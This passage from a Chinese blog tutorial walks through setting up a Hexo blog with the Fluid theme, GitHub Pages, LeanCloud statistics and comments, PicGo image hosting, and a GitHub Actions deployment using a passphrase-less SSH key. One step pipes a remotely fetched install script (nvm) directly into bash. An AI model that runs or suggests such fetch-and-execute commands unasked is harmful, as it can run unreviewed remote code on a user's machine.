class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这是一个简单的页面，你可以先在仓库里面放入一个index.html尝试一下是否能打开自己的页面</p><p>如果可以打开页面，就可以将这个文件删除了，在这个方案中，我们不需要手动向这个仓库中添加任何文件，会自动将编译号之后的文件放里面</p><p>2.然后创建一个存放你图片的仓库</p><p>在我的github中，我将这个仓库命名为Pic。</p><p>3.创建一个存放自己源码的仓库</p><p>我的存放源码的仓库叫做blog</p><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p>由于我使用的是wsl是自带的git，所以不需要再下载git，如果想在windows环境下运行git，可以自己尝试在windows上下载git，但是听说很容易报错<a href="https://blog.csdn.net/yaorongke/article/details/119085413">git下载(Windows)</a></p><h3 id="安装NodeJS"><a href="#安装NodeJS" class="headerlink" title="安装NodeJS"></a>安装NodeJS</h3><p>如果在windows环境下安装NodeJS，请参考<a href="https://blog.csdn.net/yaorongke/article/details/119084295">NodeJS安装及配置(Windows)</a></p><p>我使用的方法是使用nvm安装安装NodeJS</p><ol><li><p>安装 <code>nvm</code>​：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash<br></code></pre></td></tr></table></figure></li><li><p>使 <code>nvm</code>​ 立即可用：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure></li><li><p>使用 <code>nvm</code>​ 安装 Node.js（例如安装最新版的 Node.js）：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nvm install node  <span class="hljs-comment"># 安装最新的版本</span><br></code></pre></td></tr></table></figure><p> 或者安装特定版本：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nvm install 16  <span class="hljs-comment"># 安装 Node.js 16.x 版本</span><br></code></pre></td></tr></table></figure></li><li><p>设置默认版本（如果有多个版本）：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nvm use node   <span class="hljs-comment"># 使用最新版本</span><br>nvm use 16     <span class="hljs-comment"># 使用 Node.js 16.x</span><br></code></pre></td></tr></table></figure></li><li><p>检查版本确认安装：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">node -v<br>npm -v<br></code></pre></td></tr></table></figure></li></ol><p>但是nvm工具是国外的，可能下载失败（我采用的是给我的wsl使用镜像走我本机的代理）</p><p>可以使用apt下载NodeJS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install nodejs npm<br></code></pre></td></tr></table></figure><p>但是这样安装可能安装的版本不支持</p><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>好啦，准备工作弄好了，我们要开始搭建博客了</p><p>我使用的是采用Hexo搭建个人博客</p><p>安装 Hexo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install -g hexo-cli<br></code></pre></td></tr></table></figure><p>查看版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo -v<br></code></pre></td></tr></table></figure><p>创建一个项目 hexo-blog 并初始化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo init hexo-blog<br><span class="hljs-built_in">cd</span> hexo-blog<br>npm install<br></code></pre></td></tr></table></figure><p>本地启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo g<br>hexo server<br></code></pre></td></tr></table></figure><p>浏览器访问 <a href="http://localhost:4000，页面默认主图风格如下">http://localhost:4000，页面默认主图风格如下</a></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402145619.png" alt="image"></p><p>是真的很简陋了，可以下载一个主题改改</p><h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p>由于我只用过fluid，我就只介绍一下fluid吧</p><p><a href="https://github.com/fluid-dev/hexo-theme-fluid/releases">Fluid</a></p><p>去里面下载最新的release版本解压到thems目录并重命名为fluid</p><p>指定主题</p><p>如下修改 Hexo 博客目录中的 _config.yml：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">theme: fluid  <span class="hljs-comment"># 指定主题</span><br>language: zh-CN  <span class="hljs-comment"># 指定语言，会影响主题显示的语言，按需修改</span><br></code></pre></td></tr></table></figure><p>创建「关于页」</p><p>首次使用主题的「关于页」需要手动创建：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo new page about<br></code></pre></td></tr></table></figure><p>创建成功后，编辑博客目录下 &#x2F;source&#x2F;about&#x2F;index.md，添加 layout 属性。</p><h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><h3 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402154553.png" alt="image"></p><p>按这个修改（这个在这个文件的开头）</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402154337.png" alt="image"></p><p>这里把主题修改为fluid（文件的末尾处）</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402154443.png" alt="image"></p><p>这个在文件的末尾，repo是ssh</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402154751.png" alt="image"></p><h3 id="thems-fluid-config-yml"><a href="#thems-fluid-config-yml" class="headerlink" title="&#x2F;thems&#x2F;fluid&#x2F;_config.yml"></a>&#x2F;thems&#x2F;fluid&#x2F;_config.yml</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402155057.png" alt="image"></p><p>这里是修改浏览器导航的那个头像图案的,如下图</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402160452.png" alt="image"></p><p>​​</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402155405.png" alt="image"></p><p>这里是修改打字效果的一些设置，我没改</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402155601.png" alt="image"></p><p>这里修改的的是浏览器导航的文字</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402155654.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402155801.png" alt="image"></p><p>这里修改的是背景图</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402155847.png" alt="image"></p><p>就是这个图</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402155923.png" alt="image"></p><p>修改的是首页的文字，就是上面那个图中间的文字</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402160524.png" alt="image"></p><p>这是修改关于页的一些配置，avatar图片是下图中的那个小猫图片</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250402160626-z5bf1bm.png" alt="image"></p><p>这是我修改后的代码和样子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">about:<br>  <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>  banner_img: /img/default.png<br>  banner_img_height: 60<br>  banner_mask_alpha: 0.3<br>  avatar: /img/avatar.png<br>  name: <span class="hljs-string">&quot;喵喵喵~&quot;</span><br>  intro: <span class="hljs-string">&quot;你有小鱼干吗&quot;</span><br>  <span class="hljs-comment"># 更多图标可从 https://hexo.fluid-dev.com/docs/icon/ 查找，`class` 代表图标的 css class，添加 `qrcode` 后，图标不再是链接而是悬浮二维码</span><br>  <span class="hljs-comment"># More icons can be found from https://hexo.fluid-dev.com/docs/en/icon/  `class` is the css class of the icon. If adding `qrcode`, the icon is no longer a link, but a hovering QR code</span><br>  icons:<br>    - &#123; class: <span class="hljs-string">&quot;iconfont icon-github-fill&quot;</span>, <span class="hljs-built_in">link</span>: <span class="hljs-string">&quot;https://github.com/N1mbus-lock&quot;</span>, tip: <span class="hljs-string">&quot;GitHub&quot;</span> &#125;<br>    - &#123; class: <span class="hljs-string">&quot;iconfont icon-qq-fill&quot;</span>, qrcode: <span class="hljs-string">&quot;/img/qq.png&quot;</span> &#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402161339.png" alt="image"></p><p>关于社交软件的图标，可以在这里面找<a href="https://hexo.fluid-dev.com/docs/icon/">https://hexo.fluid-dev.com/docs/icon/</a></p><p>这些就是一些样式的修改，我放出来的是我自己修改过的地方，如果有更多需求，可以自己去看看代码然后按需修改</p><h3 id="添加浏览量统计"><a href="#添加浏览量统计" class="headerlink" title="添加浏览量统计"></a>添加浏览量统计</h3><p>先去<a href="https://console.leancloud.cn/">LeanCloud</a>里面注册一个账号然后认证一下</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402162723.png" alt="image"></p><p>创建一个应用，选择开发版</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-02%20162750-20250402163127-mg7jggw.png" alt="屏幕截图 2025-04-02 162750"></p><p>在设置里面的操作凭证里面，记录下appid，appkey和rest api服务器地址</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402163348.png" alt="image"></p><p>在这把这个改为true</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402163524.png" alt="image"></p><p>然后再在这把appid，appkey和rest api服务器地址依次填进去</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402163645.png" alt="image"></p><p>这里修改为这样</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402163907.png" alt="image"></p><p>可以看到出现了浏览次数</p><h3 id="添加评论功能"><a href="#添加评论功能" class="headerlink" title="添加评论功能"></a>添加评论功能</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402164118.png" alt="image"></p><p>先把评论功能开启</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402164208.png" alt="image"></p><p>把之前的appid和appkey填进去就可以了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402164330.png" alt="image"></p><p>评论头像加载不出来，应该是有地方没改到，但是想摆烂，就这样吧，也不是不能接受</p><p>‍</p><p>现在我们的网站已经在本地搭好了，接下来就是部署到github上</p><p>‍</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="PicGo配置"><a href="#PicGo配置" class="headerlink" title="PicGo配置"></a>PicGo配置</h3><p>把思源里面的插件配置好，让它能够把我们的图片放到github仓库里面</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250402165103-6iolp44.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402165108.png" alt="image"></p><p>选择github作为图床，然后按如图配置，如果不会生成token，<a href="https://docs.github.com/zh/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens">github生成token</a>（生成不会过期的token，就不用一直换了）</p><p>PicGO就配置好了</p><h3 id="publisher配置"><a href="#publisher配置" class="headerlink" title="publisher配置"></a>publisher配置</h3><p>先把你之前写在本地的文件导入到你存放源码的仓库里面，只需要传如下图的文件就可以了（如果之前没有使用过github，传文件应该会成为一个很大的挑战，<del>因为我就在这被卡住了</del>）</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402165947.png" alt="image"></p><p>然后进入到思源里面进行配置插件</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402165612.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402165617.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402165621.png" alt="image"></p><p>导入平台之后点进hexo里面进行配置，配置内容如图</p><h3 id="github-action"><a href="#github-action" class="headerlink" title="github action"></a>github action</h3><p>生成一对ssh公私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -t ed25519 -f hexo_deploy_key_nopass -N <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>请使用这个命令生成公私钥，笔者当时在配置时候就因为这个问题找了好久的报错</p><h4 id="为什么要使用这个命令"><a href="#为什么要使用这个命令" class="headerlink" title="为什么要使用这个命令"></a>为什么要使用这个命令</h4><p>因为这个生成公私钥的命令不需要输入密码，而一般生成的公私钥需要输入密码，但是可能是因为我当时使用的那一份脚本没有输入密码，所以一直报权限错误（<del>应该是吧</del>）</p><p>然后进入到github里面你存放源码的那一个仓库里面</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402171956.png" alt="image"></p><p>在setting里面选择<code>secrets and variables</code>​选择<code>Actions</code>​进入到这个界面，创建一个新的<code>secret</code>​</p><p>命名为<code>HEXO_DEPLOY_PRI</code>​（因为那一份脚本里就是这样写的）然后将<code>hexo_deploy_key_nopass</code>​里的所有内容写进去</p><p>然后进入到我们之前创建的那个yourname<a href="https://github.com/N1mbus-lock/N1mbus-lock.github.io">.github.io</a>仓库</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402173308.png" alt="image"></p><p>setting里选择<code>Deploy keys</code>​，然后将<code>hexo_deploy_key_nopass.pub</code>​里的所用东西写进去，命名为<code>HEXO_DEPLOY_PUB</code>​</p><p>现在已经完成了这两个仓库间的通信</p><p>最后，再在存放源码的仓库里面的.github目录下创建一个一个工作流程然后在里面写入我们的配置文件main.yml就成功了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402174114.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402174140.png" alt="image"></p><p>写入</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">name:</span> <span class="hljs-string">HEXO</span> <span class="hljs-string">CI</span><br><br><span class="hljs-attr">on:</span><br>  <span class="hljs-attr">push:</span><br>    <span class="hljs-attr">branches:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">main</span><br><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">build:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span><br>    <span class="hljs-attr">strategy:</span><br>      <span class="hljs-attr">matrix:</span><br>        <span class="hljs-attr">node-version:</span> [<span class="hljs-number">20.</span><span class="hljs-string">x</span>]<br><br>    <span class="hljs-attr">steps:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v3</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Use</span> <span class="hljs-string">Node.js</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.node-version</span> <span class="hljs-string">&#125;&#125;</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v3</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">node-version:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.node-version</span> <span class="hljs-string">&#125;&#125;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Configuration</span> <span class="hljs-string">environment</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-attr">HEXO_DEPLOY_PRI:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.HEXO_DEPLOY_PRI</span> <span class="hljs-string">&#125;&#125;</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          mkdir -p ~/.ssh/</span><br><span class="hljs-string">          echo &quot;$HEXO_DEPLOY_PRI&quot; | tr -d &#x27;\r&#x27; &gt; ~/.ssh/id_rsa</span><br><span class="hljs-string">          chmod 600 ~/.ssh/id_rsa</span><br><span class="hljs-string">          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span><br><span class="hljs-string">          git config --global user.name &quot;&quot;  #这里写你的github昵称</span><br><span class="hljs-string">          git config --global user.email &quot;&quot; #这里写你的邮箱</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">dependencies</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          npm install -g hexo-cli</span><br><span class="hljs-string">          npm install hexo-deployer-git --save</span><br><span class="hljs-string">          npm install</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">hexo</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          hexo clean</span><br><span class="hljs-string">          hexo g</span><br><span class="hljs-string">          hexo d</span><br></code></pre></td></tr></table></figure><p>好啦好啦，终于大功告成了，这样你就会拥有一个属于自己的博客了</p><p>然后使用publisher发布就可以了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402175054.png" alt="image"></p><h2 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h2><h3 id="1-安全性"><a href="#1-安全性" class="headerlink" title="1.安全性"></a>1.安全性</h3><p>我们开始部署的存放blog源码的仓库公开的，好像去年爆出过一个漏洞可以使用一种插件修改别人的github仓库内容，以防别人破环我们的博客。</p><p>解决方案：直接将blog源码仓库改为私人的即可，只要你给publisher中的token权限足够，不会出现通信问题</p><h3 id="2-图片问题"><a href="#2-图片问题" class="headerlink" title="2.图片问题"></a>2.图片问题</h3><p>使用PicGO会将本地图片一直上传至github仓库并替换图片链接，导致在无网络的环境下思源上的图片加载不出来</p><p>解决方案：在我们后来的实践中发现，publisher插件中存在内置的picgo，所以即使关闭picgo插件也能够上传并且不会替换你本地链接，网页上的链接也会是github上的链接（这样的话，好像没有必要picgo这个插件）</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/yaorongke/article/details/119089190">GitHub Pages + Hexo搭建个人博客网站，史上最全教程</a></p><p><a href="https://op30132.github.io/2020/02/05/github-action/">Hexo + github actions 自動化部署</a></p><p>和Dre4m师傅一起搭建的，这是她写的文章，如果我写的有什么遗漏的，可以看看她的 <a href="https://dre4m017.github.io/post/free-and-open-source-oneclick-deployment-solution-5yk6g.html">免费开源的一键化部署方案</a></p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>github pages</tag>
      
      <tag>Hexo</tag>
      
      <tag>思源</tag>
      
      <tag>博客搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
